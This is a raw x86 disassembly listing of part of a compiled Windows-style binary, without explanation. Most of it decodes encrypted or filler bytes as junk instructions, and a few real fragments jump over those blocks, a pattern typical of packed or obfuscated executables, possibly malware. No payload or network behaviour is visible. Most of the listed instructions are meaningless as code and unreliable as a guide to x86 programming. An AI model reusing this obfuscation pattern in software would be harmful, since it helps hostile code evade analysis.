  40518d:	or     ebp,DWORD PTR [ecx]
  40518f:	loopne 0x405132
  405191:	xor    eax,edx
  405193:	pop    ss
  405194:	lea    ebp,ds:0x6295fa83
  40519a:	cmp    DWORD PTR [edi],edx
  40519c:	mov    WORD PTR [eax+ecx*1-0x2d],?
  4051a0:	imul   edi,DWORD PTR [ebx],0xb03c9496
  4051a6:	push   0x4b8d6475
  4051ab:	(bad)  
  4051ac:	fucomip st,st(1)
  4051ae:	in     al,0x6b
  4051b0:	(bad)  
  4051b1:	(bad)
  4051b5:	out    0x89,al
  4051b7:	push   esp
  4051b8:	aam    0x46
  4051ba:	ss dec edi
  4051bc:	stos   BYTE PTR es:[edi],al
  4051bd:	cmp    al,0xbe
  4051bf:	mov    ebp,0x3261a2ad
  4051c4:	mov    ecx,0xec74ddea
  4051c9:	clc    
  4051ca:	cmp    BYTE PTR [ecx+0x5c8dfa7b],0x2e
  4051d1:	dec    ebp
  4051d2:	sub    ch,BYTE PTR [edi]
  4051d4:	mov    ecx,0x175e295c
  4051d9:	jge    0x405239
  4051db:	mov    esp,0xadae79b9
  4051e0:	sbb    BYTE PTR [ecx+0x52c7af68],cl
  4051e6:	and    bl,BYTE PTR [edx+0x3d]
  4051e9:	xchg   DWORD PTR ds:0xed73fd98,esi
  4051ef:	je     0x405184
  4051f1:	int3   
  4051f2:	repz sbb al,0xd1
  4051f5:	dec    ebx
  4051f6:	and    eax,0x4266354e
  4051fb:	aad    0x25
  4051fd:	dec    esp
  4051fe:	xor    BYTE PTR [eax],bh
  405200:	pop    ss
  405201:	xchg   esi,ebx
  405203:	jbe    0x405192
  405205:	test   BYTE PTR [eax],dl
  405207:	call   0x845:0x89003272
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	mov    ch,0x41
  40523d:	sub    eax,0x7c2ad013
  405242:	jl     0x4051f9
  405244:	jns    0x4052c2
  405246:	jl     0x405224
  405248:	or     BYTE PTR [eax-0x58],0x8b
  40524c:	pop    ebp
  40524d:	pop    DWORD PTR [esi]
  40524f:	dec    eax
  405250:	stos   DWORD PTR es:[edi],eax
  405251:	xor    esp,edi
  405253:	adc    eax,0x210b1df5
  405258:	push   es
  405259:	daa    
  40525a:	xchg   edi,eax
  40525b:	push   cs
  40525c:	fwait
  40525d:	test   al,0xb4
  40525f:	jae    0x40527f
  405261:	add    ebp,DWORD PTR [ebx-0x55dbd152]
  405267:	(bad)  
  405268:	test   eax,0x54671583
  40526d:	mov    esi,0xb55f6e4
  405272:	inc    edx
  405273:	outs   dx,BYTE PTR ds:[esi]
  405274:	mov    ds:0xff02e1d6,eax
  405279:	sti    
  40527a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40527b:	xor    bl,cl
  40527d:	std    
  40527e:	push   esi
  40527f:	push   edi
  405280:	jno    0x40521e
  405282:	and    DWORD PTR [esi],0xffffffd2
  405285:	bound  esi,QWORD PTR [ecx]
  405287:	js     0x4052f4
  405289:	cmp    dh,BYTE PTR [edi+0x2cc9031a]
  40528f:	pushf  
  405290:	jbe    0x405223
  405292:	push   ebp
  405293:	fs push ecx
  405295:	xor    dh,al
  405297:	in     eax,dx
  405298:	loope  0x405251
  40529a:	push   esi
  40529b:	dec    ecx
  40529c:	in     al,0xb9
  40529e:	mov    ah,BYTE PTR [esi-0x72]
  4052a1:	int3   
  4052a2:	lods   al,BYTE PTR ds:[esi]
  4052a3:	ja     0x405313
  4052a5:	pop    ecx
  4052a6:	or     DWORD PTR [esi],ebp
  4052a8:	inc    edi
  4052a9:	fs (bad) 
  4052ab:	fnstsw WORD PTR [edi+edx*2-0x72e15906]
  4052b2:	and    al,0x6a
  4052b4:	adc    eax,DWORD PTR [edi+0x5]
  4052b7:	push   ebp
  4052b8:	test   al,0x27
  4052ba:	xchg   ebp,ecx
  4052bc:	pop    es
  4052bd:	dec    eax
  4052be:	fild   WORD PTR gs:[ecx+0x58]
  4052c2:	or     DWORD PTR [eax+0x31fd9c77],edx
  4052c8:	xchg   esp,eax
  4052c9:	push   ds
  4052ca:	xchg   esp,eax
  4052cb:	jecxz  0x405273
  4052cd:	std    
  4052ce:	daa    
  4052cf:	mov    eax,ds:0x9173e646
  4052d4:	jno    0x40533e
  4052d6:	mov    dl,0xda
  4052d8:	(bad)  
  4052d9:	sbb    al,0x3
  4052db:	push   edx
  4052dc:	shl    BYTE PTR [eax-0x382deace],cl
  4052e2:	lods   al,BYTE PTR ds:[esi]
  4052e3:	push   edi
  4052e4:	adc    ebx,edi
  4052e6:	gs aad 0xfb
  4052e9:	test   BYTE PTR [ecx+edx*8+0x496e295c],dl
  4052f0:	clc    
  4052f1:	jns    0x4052e3
  4052f3:	inc    DWORD PTR [esi+0x58801cd3]
  4052f9:	icebp  
  4052fa:	jno    0x4052fb
  4052fc:	xor    al,0x3c
  4052fe:	xor    al,0x66
  405300:	sar    bl,cl
  405302:	or     BYTE PTR [ecx],bl
  405304:	imul   edx,DWORD PTR [eax],0xffffff8a
  405307:	push   0x7
  405309:	dec    ecx
  40530a:	retf   0x27bf
  40530d:	sar    BYTE PTR [edx+0x43],cl
  405310:	call   0x6ab8a100
  405315:	xor    DWORD PTR [esi+0x26d47ea4],ecx
  40531b:	sub    ch,BYTE PTR ds:0xc731a83b
  405321:	out    0x66,eax
  405323:	imul   edx,DWORD PTR [ebx-0x3b10e30a],0xfffffffc
  40532a:	push   ecx
  40532b:	adc    DWORD PTR [ebx],eax
  40532d:	lea    esi,[edi-0x4a]
  405330:	test   eax,0x3c4c17d8
  405335:	mov    esi,0xccff36e0
  40533a:	dec    esi
  40533b:	int3   
  40533c:	test   BYTE PTR [eax+0x50],dh
  40533f:	ret    0x2d44
  405342:	popf   
  405343:	pusha  
  405344:	mov    bh,0x19
  405346:	cmp    al,dl
  405348:	jns    0x4053a7
  40534a:	ins    DWORD PTR es:[edi],dx
  40534b:	and    BYTE PTR [eax+0x1a1568a7],dh
  405351:	dec    esp
  405352:	pop    ss
  405353:	retf   0x19b2
  405356:	outs   dx,DWORD PTR ds:[esi]
  405357:	jl     0x4053cd
  405359:	(bad)
  40535e:	sbb    eax,0x43492624
  405363:	jbe    0x4053c2
  405365:	nop
  405366:	fadd   DWORD PTR [eax]
  405368:	test   BYTE PTR [edx-0x1b],al
  40536b:	out    dx,eax
  40536c:	push   es
  40536d:	xchg   edi,eax
  40536e:	aam    0x9e
  405370:	xor    al,0x6b
  405372:	cli    
  405373:	aad    0xc2
  405375:	aas    
  405376:	xor    esp,DWORD PTR [edx+0xf]
  405379:	sub    BYTE PTR [edx+0x597d8d9f],dl
  40537f:	dec    esp
  405381:	add    dl,BYTE PTR [ebx]
  405383:	or     al,0x34
  405385:	pusha  
  405386:	inc    edx
  405387:	jle    0x4053ff
  405389:	add    esp,eax
  40538b:	in     al,dx
  40538c:	or     BYTE PTR [edi+0x72],0x6e
  405390:	jns    0x4053fb
  405392:	xchg   esp,ebx
  405394:	adc    BYTE PTR [ebx-0x9550650],dh
  40539a:	jbe    0x40540d
  40539c:	jmp    0xc6aadeaa
  4053a1:	in     eax,0xa0
  4053a3:	xlat   BYTE PTR ds:[ebx]
  4053a4:	sub    edx,DWORD PTR [edi]
  4053a6:	ins    DWORD PTR es:[edi],dx
  4053a7:	and    DWORD PTR [ebx-0x24],0xddc973c1
  4053ae:	add    DWORD PTR [ebp+0x63],ecx
  4053b1:	or     esi,DWORD PTR [edi]
  4053b3:	pushw  0x6b5e
  4053b7:	pop    ss
  4053b8:	cmp    al,0x48
  4053ba:	dec    edi
  4053bb:	stos   DWORD PTR es:[edi],eax
  4053bc:	fistp  QWORD PTR [edi+0x2f5eeef3]
  4053c2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4053c4:	jmp    0xb791d018
  4053c9:	in     eax,0x97
  4053cb:	or     esp,DWORD PTR [edi-0x68]
  4053ce:	call   0x3bdb:0x17c7a0b1
  4053d5:	xor    eax,edx
  4053d7:	iret   
  4053d8:	mov    ds:0x5625d563,eax
  4053dd:	hlt    
  4053de:	aad    0x60
  4053e0:	dec    edi
  4053e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e2:	add    al,0x71
  4053e4:	xchg   BYTE PTR [ebx+0x26],dh
  4053e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e8:	dec    esp
  4053e9:	out    0xbc,al
  4053eb:	lea    ecx,[ebx-0x43028d08]
  4053f1:	addr16 xchg ecx,eax
  4053f3:	addr16 jl 0x4053d5
  4053f6:	test   DWORD PTR [ebp+0x57373ff],0x53cd5c0b
  405400:	inc    ebx
  405401:	push   ss
  405402:	mov    al,ds:0xaa1fbf31
  405407:	scas   eax,DWORD PTR es:[edi]
  405408:	inc    edi
  405409:	sbb    al,0xa6
  40540b:	movlps QWORD PTR [ebp-0x32c63aa6],xmm2
  405412:	and    BYTE PTR [ecx],dh
  405414:	pop    edx
  405415:	jp     0x405412
  405417:	(bad)  
  405418:	cmp    esi,DWORD PTR [eax+0x258305c5]
  40541e:	inc    edi
  40541f:	mov    DWORD PTR [eax+0x58ac8984],0x7b1a5d37
  405429:	idiv   BYTE PTR [esi-0x4c]
  40542c:	loop   0x405423
  40542e:	aam    0x88
  405430:	fwait
  405431:	(bad)  
  405432:	out    0x43,eax
  405434:	mov    al,0x2c
  405436:	xchg   DWORD PTR [esi-0x23],eax
  405439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40543a:	pop    ds
  40543b:	addr16 aaa 
  40543d:	add    edx,DWORD PTR [ecx]
  40543f:	jnp    0x405454
  405441:	mov    WORD PTR ds:0x5ff17615,ss
  405447:	jne    0x40545d
  405449:	jg     0x40540f
  40544b:	pop    ecx
  40544c:	push   0x12
  40544e:	loop   0x4054be
  405450:	pusha  
  405451:	out    0x7e,eax
  405453:	pop    ecx
  405454:	mov    edx,DWORD PTR [edx-0x80]
  405457:	into   
  405458:	and    al,BYTE PTR [ecx]
  40545a:	and    BYTE PTR ds:0xc60c5f85,bl
  405460:	nop
  405461:	in     eax,dx
  405462:	sti    
  405463:	dec    ebp
  405464:	pop    ebx
  405465:	and    BYTE PTR [esi+eax*8],0xea
  405469:	mov    eax,ds:0xff57447b
  40546e:	add    eax,0x84a7e53c
  405473:	pop    esp
  405474:	scas   al,BYTE PTR es:[edi]
  405475:	inc    eax
  405476:	jmp    0xccf763de
  40547b:	inc    eax
  40547c:	mov    dh,BYTE PTR [ebp-0x6d7da52d]
  405482:	and    eax,0xd7c719c5
  405487:	and    DWORD PTR [ebp+eax*1-0x68],edx
  40548b:	mov    BYTE PTR [edx+eiz*4-0x39df6fb7],0xdc
  405493:	pop    edx
  405494:	mov    bh,cl
  405496:	fwait
  405497:	jecxz  0x40550a
  405499:	popf   
  40549a:	test   al,ch
  40549c:	mov    eax,ds:0x6585fbeb
  4054a1:	jle    0x4054a0
  4054a3:	mov    ebp,0x4bcc9ee8
  4054a8:	das    
  4054a9:	fdivr  QWORD PTR [edx]
  4054ab:	xor    DWORD PTR [eax-0x699aa445],0xffffffea
  4054b2:	(bad)  
  4054b3:	xchg   edx,eax
  4054b4:	fisttp QWORD PTR [ecx]
  4054b6:	mov    ds:0x9a492802,eax
  4054bb:	push   ecx
  4054bc:	idiv   DWORD PTR [eax+ecx*4-0x3d]
  4054c0:	push   ebx
  4054c1:	lods   al,BYTE PTR ds:[esi]
  4054c2:	sub    al,cl
  4054c4:	jp     0x405494
  4054c6:	cs leave 
  4054c8:	and    BYTE PTR [edx-0x50],0x6c
  4054cc:	jnp    0x40550a
  4054ce:	pop    ebp
  4054cf:	aad    0xf3
  4054d1:	ja     0x405455
  4054d3:	sbb    ebp,DWORD PTR [esi-0x688685e9]
  4054d9:	enter  0x6800,0x87
  4054dd:	sbb    eax,0x59d4e162
  4054e2:	in     eax,0x6b
  4054e4:	sbb    BYTE PTR [ecx-0x16e89358],dh
  4054ea:	vmovdqu YMMWORD PTR [eax],ymm0
  4054ee:	(bad)  
  4054ef:	pop    ds
  4054f0:	sub    eax,0x73247ec3
  4054f5:	test   BYTE PTR [ebx],bl
  4054f7:	jo     0x405494
  4054f9:	repz sbb eax,0xde89949b
  4054ff:	adc    BYTE PTR [edx+0x49ae5f87],ch
  405505:	add    ecx,DWORD PTR [ebp+0x7]
  405508:	pop    ebp
  405509:	(bad)  
  40550a:	mov    BYTE PTR [edi+0xf],al
  40550d:	test   BYTE PTR [edx+0x5becbec0],bl
  405513:	mov    esi,0x47087a2b
  405518:	mov    esi,0xd91cbc10
  40551d:	inc    edx
  40551e:	std    
  40551f:	lods   al,BYTE PTR ds:[esi]
  405520:	das    
  405521:	xor    eax,DWORD PTR [esi-0x407dfd47]
  405527:	call   0xe1dd7f3
  40552c:	jns    0x405521
  40552e:	mov    ds:0x4e2c70de,eax
  405533:	mov    ch,0x88
  405535:	xor    BYTE PTR [bx+0x5b],ch
  405539:	mov    al,ds:0x788e961b
  40553e:	es loop 0x40556c
  405541:	mov    ecx,0xa0315515
  405546:	xor    eax,0x83640f98
  40554b:	(bad)  
  40554c:	xor    ch,dl
  40554e:	lea    ebx,[eax+0x4f]
  405551:	outs   dx,DWORD PTR ds:[esi]
  405552:	xchg   ecx,eax
  405553:	pop    es
  405554:	repnz pop esp
  405556:	inc    edi
  405557:	imul   ecx,DWORD PTR [esi],0x17
  40555a:	xor    ebp,ecx
  40555c:	mov    ebx,0xa580d840
  405561:	stos   DWORD PTR es:[edi],eax
  405562:	call   0x43f:0xd031e04b
  405569:	enter  0x5ac6,0x3b
  40556d:	and    eax,0xafdd96aa
  405572:	ficomp DWORD PTR [ebp-0x48639d76]
  405578:	adc    eax,0x2a712380
  40557d:	jle    0x405504
  40557f:	xchg   esp,eax
  405580:	scas   al,BYTE PTR es:[edi]
  405581:	or     al,0x57
  405583:	clc    
  405584:	fadd   st,st(3)
  405586:	je     0x4055b9
  405588:	push   es
  405589:	rol    eax,0x8
  40558c:	mov    esi,0x38b9d4e4
  405591:	xchg   edx,eax
  405592:	scas   al,BYTE PTR es:[edi]
  405593:	lock and DWORD PTR [esi+0x1ccc49d0],ecx
  40559a:	test   BYTE PTR [edx-0x60d55779],dh
  4055a0:	jns    0x40558f
  4055a2:	pop    ebx
  4055a3:	jmp    0xb1dd:0xdcf07884
  4055aa:	adc    al,cl
  4055ac:	fwait
  4055ad:	sbb    DWORD PTR [ecx-0x4bbe35f1],esi
  4055b3:	js     0x405537
  4055b5:	pop    ebp
  4055b6:	xlat   BYTE PTR ds:[ebx]
  4055b7:	lock dec ebp
  4055b9:	cwde   
  4055ba:	mov    esi,eax
  4055bc:	dec    ebx
  4055bd:	and    eax,0x8f3a7f4e
  4055c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055c3:	lahf   
  4055c4:	mov    dl,0x41
  4055c6:	lahf   
  4055c7:	jp     0x40561a
  4055c9:	sub    al,0xa3
  4055cb:	cmc    
  4055cc:	cdq    
  4055cd:	adc    BYTE PTR [eax-0x22],ah
  4055d0:	or     al,0x11
  4055d2:	daa    
  4055d3:	pop    esi
  4055d4:	(bad)  
  4055d5:	jmp    0x40556d
  4055d7:	(bad)  
  4055d8:	div    BYTE PTR [ecx]
  4055da:	icebp  
  4055db:	sbb    eax,0xe1c1f30f
  4055e0:	inc    edi
  4055e1:	push   ebp
  4055e2:	xor    edx,DWORD PTR [edx+0x2a416cd0]
  4055e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055e9:	out    0x9d,al
  4055eb:	xor    al,0xa1
  4055ed:	sub    BYTE PTR [edi-0x521d3b7d],bh
  4055f3:	mov    esp,0xd041a384
  4055f8:	fild   WORD PTR [ebp-0x77]
  4055fb:	test   ch,ah
  4055fd:	cld    
  4055fe:	push   ecx
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x433663,0x0
  40560a:	mov    eax,ds:0x433663
  40560f:	inc    eax
  405610:	mov    ds:0x433663,eax
  405615:	cmp    DWORD PTR ds:0x433663,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433663,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433663
  405642:	inc    eax
  405643:	mov    ds:0x433663,eax
  405648:	cmp    DWORD PTR ds:0x433663,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	mov    DWORD PTR ds:0x36097789,edx
  405675:	jl     0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	jne    0x405603
  40567d:	popa   
  40567e:	xor    ebp,edx
  405680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405681:	inc    esi
  405682:	dec    esp
  405683:	sahf   
  405684:	retf   
  405685:	repz xchg edx,eax
  405687:	cmp    cl,BYTE PTR [edx+0x38946027]
  40568d:	push   ecx
  40568e:	inc    edi
  40568f:	out    0xd9,al
  405691:	stc    
  405692:	ds int3 
  405694:	jnp    0x405624
  405696:	jl     0x4056bf
  405698:	dec    edi
  405699:	mov    al,ds:0x8953fb05
  40569e:	add    BYTE PTR [ecx-0x4d],al
  4056a1:	fbstp  TBYTE PTR [ecx+0x18]
  4056a4:	inc    edx
  4056a5:	test   DWORD PTR ds:0xda159c80,eax
  4056ab:	rol    edi,0xd8
  4056ae:	fsubr  st(2),st
  4056b0:	mov    eax,0x3849ec46
  4056b5:	pop    ds
  4056b6:	sbb    eax,0xe22d768
  4056bb:	jle    0x4056a4
  4056bd:	dec    esi
  4056be:	dec    edi
  4056bf:	std    
  4056c0:	pop    edi
  4056c1:	jo     0x40573f
  4056c3:	push   ebx
  4056c4:	rcr    DWORD PTR [ecx-0x5b008b36],cl
  4056ca:	add    BYTE PTR [edx],bh
  4056cc:	shr    BYTE PTR [ecx],0xe9
  4056cf:	cmc    
  4056d0:	and    ecx,edi
  4056d2:	out    0xde,al
  4056d4:	push   esi
  4056d5:	xor    eax,0x1593f3d6
  4056da:	stos   BYTE PTR es:[edi],al
  4056db:	lahf   
  4056dc:	xor    ebx,DWORD PTR [esi-0x3b]
  4056df:	jns    0x4056e8
  4056e1:	adc    al,0x53
  4056e3:	(bad)  
  4056e4:	mov    bl,0x5a
  4056e6:	clc    
  4056e7:	xchg   BYTE PTR [edx-0x55bf02d],cl
  4056ed:	cmp    DWORD PTR [eax+0x42],edi
  4056f0:	jb     0x405762
  4056f2:	or     eax,0x6fdfc610
  4056f7:	dec    edx
  4056f8:	icebp  
  4056f9:	push   0x56ca1aa8
  4056fe:	dec    eax
  4056ff:	mov    edi,esi
  405701:	retf   0x82af
  405704:	stos   DWORD PTR es:[edi],eax
  405705:	ss push esp
  405707:	inc    ebp
  405708:	sub    BYTE PTR [ecx-0x4634b446],0x23
  40570f:	add    bl,BYTE PTR [edi]
  405711:	mov    al,ds:0xdd6cdc82
  405716:	jle    0x4056e3
  405718:	cli    
  405719:	add    eax,0x14ef1414
  40571e:	test   al,0x2a
  405720:	cwde   
  405721:	inc    esp
  405722:	bound  ebp,QWORD PTR [eax-0x4e]
  405725:	dec    ecx
  405726:	scas   eax,DWORD PTR es:[edi]
  405727:	xor    ah,BYTE PTR [edi-0x42]
  40572a:	lahf   
  40572b:	lea    ebp,[ecx]
  40572d:	pusha  
  40572e:	addr16 sub eax,0x5a7f702f
  405734:	cli    
  405735:	aam    0x41
  405737:	shl    ebx,cl
  405739:	std    
  40573a:	jp     0x405712
  40573c:	fs jae 0x405712
  40573f:	sub    DWORD PTR [ebp-0x1837d4eb],ebx
  405745:	jnp    0x4056fa
  405747:	xchg   edi,eax
  405748:	clc    
  405749:	jle    0x405791
  40574b:	bound  esi,QWORD PTR [eax]
  40574d:	inc    eax
  40574e:	add    al,0x18
  405750:	imul   esp,DWORD PTR [edx-0x66],0xadfdcaa0
  405757:	out    dx,al
  405758:	adc    DWORD PTR [ebx+0x3f],eax
  40575b:	in     eax,0xdb
  40575d:	clc    
  40575e:	inc    eax
  40575f:	sti    
  405760:	mov    ah,0xfb
  405762:	loopne 0x4057d7
  405764:	repz call 0x6408:0x543b2cc6
  40576c:	scas   eax,DWORD PTR es:[edi]
  40576d:	arpl   WORD PTR [edi+0x59dbd61a],bp
  405773:	jnp    0x4057f1
  405775:	xor    esi,DWORD PTR [ebp+0x4495e53c]
  40577b:	test   BYTE PTR [edx],cl
  40577d:	les    ecx,FWORD PTR [esi]
  40577f:	out    0x19,eax
  405781:	push   ecx
  405782:	and    cl,BYTE PTR [ebx]
  405784:	stos   DWORD PTR es:[edi],eax
  405785:	mov    ecx,0x8700ca49
  40578a:	inc    esp
  40578b:	jbe    0x405793
  40578d:	fs pop eax
  40578f:	xor    al,0x8d
  405791:	pop    ecx
  405792:	mov    edx,0x33d5a28f
  405797:	push   edi
  405798:	outs   dx,DWORD PTR ds:[esi]
  405799:	mov    dl,0xbf
  40579b:	and    DWORD PTR ds:0x6c902fea,eax
  4057a1:	rcl    DWORD PTR [ecx-0x5d4185d0],1
  4057a7:	add    esp,0xffffffba
  4057aa:	(bad)  
  4057ab:	mov    esi,0xc2b1442b
  4057b0:	mov    gs,WORD PTR [eax+eiz*2]
  4057b3:	push   ebp
  4057b4:	xor    esp,eax
  4057b6:	mov    gs,WORD PTR [ebx]
  4057b8:	scas   al,BYTE PTR es:[edi]
  4057b9:	mov    bh,0xb0
  4057bb:	xchg   ebp,eax
  4057bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057bd:	xchg   edx,eax
  4057be:	dec    esi
  4057bf:	push   esi
  4057c0:	push   eax
  4057c1:	and    eax,0x2275221b
  4057c6:	bound  esp,QWORD PTR [esi]
  4057c8:	pop    edi
  4057c9:	pushf  
  4057ca:	pop    ebx
  4057cb:	imul   esp,DWORD PTR [ecx+0x7b],0x11
  4057cf:	imul   BYTE PTR [eax-0x6c]
  4057d2:	or     ebx,ecx
  4057d4:	pop    ebp
  4057d5:	mov    DWORD PTR [eax],ecx
  4057d7:	daa    
  4057d8:	loop   0x405789
  4057da:	add    eax,0xde5f62b8
  4057df:	adc    BYTE PTR [ebp+0x6af8eb0a],ch
  4057e5:	nop
  4057e6:	sbb    DWORD PTR [edx+eiz*2-0x3100a1a8],esp
  4057ed:	out    0xfd,al
  4057ef:	push   ebx
  4057f0:	mov    ds:0xa2d9a570,al
  4057f5:	and    BYTE PTR [ecx],cl
  4057f7:	rep stos BYTE PTR es:[edi],al
  4057f9:	push   ss
  4057fa:	push   edi
  4057fb:	xchg   edi,eax
  4057fc:	and    edx,esi
  4057fe:	loopne 0x405846
  405800:	ins    BYTE PTR es:[edi],dx
  405801:	ror    DWORD PTR [ecx-0x66],0xfe
  405805:	loop   0x4057f2
  405807:	add    esi,eax
  405809:	jle    0x405847
  40580b:	pop    ecx
  40580c:	mov    ds:0xcd2bb5f3,al
  405811:	mov    esp,0x7f17b0f0
  405816:	lods   eax,DWORD PTR ds:[esi]
  405817:	push   ss
  405818:	push   ds
  405819:	xchg   esi,eax
  40581a:	push   ebp
  40581b:	jl     0x40588d
  40581d:	sar    BYTE PTR [ebp+0x2e],1
  405820:	cmp    eax,0x7700d3ba
  405825:	xchg   esi,eax
  405826:	pushf  
  405827:	push   0xd28a10d8
  40582c:	adc    BYTE PTR [ecx-0x54],bl
  40582f:	xchg   DWORD PTR [ecx],edi
  405831:	and    eax,0x76e6a9c1
  405836:	mov    esp,0x84655d60
  40583b:	cmp    eax,0xacfa1e65
  405840:	push   0x5f
  405842:	sbb    dh,ch
  405844:	inc    edi
  405845:	js     0x405818
  405847:	and    esp,DWORD PTR [edx-0x15c05438]
  40584d:	retf   
  40584e:	ret    0x2053
  405851:	push   ecx
  405852:	leave  
  405853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405854:	clc    
  405855:	inc    ecx
  405856:	xor    DWORD PTR [ebx+0x2a7be715],0x6d
  40585d:	sti    
  40585e:	retf   0x9fd8
  405861:	add    al,0x9
  405863:	or     edx,ebx
  405865:	push   eax
  405866:	ret    0xa8eb
  405869:	lock lock cmp bl,dl
  40586d:	in     al,dx
  40586e:	mov    dh,0xef
  405870:	rcr    BYTE PTR [ebx+ebp*8],0x5e
  405874:	in     al,0xaa
  405876:	mov    DWORD PTR [edi-0x61d53a48],esp
  40587c:	shl    DWORD PTR [edi-0x76],cl
  40587f:	jecxz  0x40581d
  405881:	xchg   ebp,eax
  405882:	outs   dx,BYTE PTR ds:[esi]
  405883:	mov    bh,0xe7
  405885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405886:	inc    edx
  405887:	xor    DWORD PTR [edx+ecx*2-0x5f],eax
  40588b:	or     DWORD PTR [ecx+ecx*1+0x2e],ecx
  40588f:	xlat   BYTE PTR ds:[ebx]
  405890:	mov    ch,0x4
  405892:	and    BYTE PTR [edx],cl
  405894:	rol    DWORD PTR [esi-0x40],0xad
  405898:	in     eax,dx
  405899:	inc    esi
  40589a:	xchg   edi,eax
  40589b:	test   eax,0xef20a9a7
  4058a0:	popa   
  4058a1:	daa    
  4058a2:	sbb    DWORD PTR [eax+0x6021b683],ebp
  4058a8:	in     eax,0x10
  4058aa:	loopne 0x4058c1
  4058ac:	and    eax,DWORD PTR [edx+0x7d72d999]
  4058b2:	or     edx,DWORD PTR [esi]
  4058b4:	sub    DWORD PTR [eax+0x312a5772],esi
  4058ba:	pop    esp
  4058bb:	inc    edi
  4058bc:	xor    ebp,ebp
  4058be:	xchg   DWORD PTR [eax],eax
  4058c0:	add    ebx,edi
  4058c2:	out    dx,eax
  4058c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c4:	sbb    DWORD PTR [ecx+0x23],eax
  4058c7:	add    BYTE PTR [esi-0x38],0x4b
  4058cb:	pop    edi
  4058cc:	inc    ebp
  4058cd:	scas   al,BYTE PTR es:[edi]
  4058ce:	push   cs
  4058cf:	(bad)  
  4058d0:	ds loope 0x405861
  4058d3:	shl    BYTE PTR [esi+ebp*2-0x244bad80],1
  4058da:	ins    BYTE PTR es:[edi],dx
  4058db:	push   edx
  4058dc:	fnsave [esi]
  4058de:	cmp    eax,esp
  4058e0:	adc    eax,0x2b5fbbe2
  4058e5:	in     al,0x14
  4058e7:	ret    
  4058e8:	xchg   DWORD PTR [eax+0x2ce8e721],eax
  4058ee:	add    eax,0xe9f32272
  4058f3:	loop   0x4058ce
  4058f5:	std    
  4058f6:	dec    ebp
  4058f7:	cbw    
  4058f9:	mov    esp,0xe01b0402
  4058fe:	cmp    BYTE PTR [edi-0x3cc181a9],dh
  405904:	retf   0x9f58
  405907:	xchg   ebp,eax
  405908:	push   cs
  405909:	mov    BYTE PTR [bx],0x59
  40590d:	mov    ebp,0x8c7e2efc
  405913:	lods   eax,DWORD PTR ds:[esi]
  405914:	js     0x4058f8
  405916:	push   0x14
  405918:	or     ebx,DWORD PTR [esi+0x38]
  40591b:	add    DWORD PTR [ecx+ebx*8-0x3d],eax
  40591f:	and    DWORD PTR [edx-0x6d],eax
  405922:	inc    ebx
  405923:	lds    edi,FWORD PTR [esi+0x7a]
  405926:	popa   
  405927:	aad    0xca
  405929:	mov    dl,0xd9
  40592b:	cmp    ah,BYTE PTR [edx]
  40592d:	scas   eax,DWORD PTR es:[edi]
  40592e:	enter  0xd4e4,0x24
  405932:	mov    ds:0x3594fe9e,eax
  405937:	(bad)  
  405938:	sar    dl,0xf3
  40593b:	lea    ecx,[edx+0x75443162]
  405941:	push   0xffffffe3
  405943:	scas   eax,DWORD PTR es:[edi]
  405944:	aas    
  405945:	adc    DWORD PTR [ebp-0x70],0xffffffe0
  405949:	lahf   
  40594a:	pop    ecx
  40594b:	sti    
  40594c:	dec    ecx
  40594d:	into   
  40594e:	pop    eax
  40594f:	push   0xa91a3e5
  405954:	ja     0x40594c
  405956:	imul   ebx,DWORD PTR [eax],0xc8307116
  40595c:	adc    BYTE PTR [ecx],0x46
  40595f:	jnp    0x405914
  405961:	out    0x94,eax
  405963:	inc    eax
  405964:	and    DWORD PTR [ecx-0x26fc09cb],ecx
  40596a:	sub    bl,BYTE PTR [edx-0x1539c392]
  405970:	jmp    0x405954
  405972:	add    eax,0xcd75dc4d
  405977:	mov    ebp,0xcecd5828
  40597c:	mov    dl,0x2d
  40597e:	push   esp
  40597f:	mov    bh,0x95
  405981:	xor    al,0xe5
  405983:	sub    eax,0xb4742827
  405988:	jl     0x405987
  40598a:	cmp    al,0x77
  40598c:	xchg   ch,ah
  40598e:	sub    eax,0x8a7a816c
  405993:	jp     0x4059ca
  405995:	and    DWORD PTR [eax+0x5e1b85ab],esp
  40599b:	cs sub edi,esi
  40599e:	jmp    0x405973
  4059a0:	mov    bh,0x2c
  4059a2:	sbb    BYTE PTR [edx],0x77
  4059a5:	push   ebp
  4059a6:	xor    cl,ch
  4059a8:	mov    ds:0x6eb59aae,al
  4059ad:	(bad)  
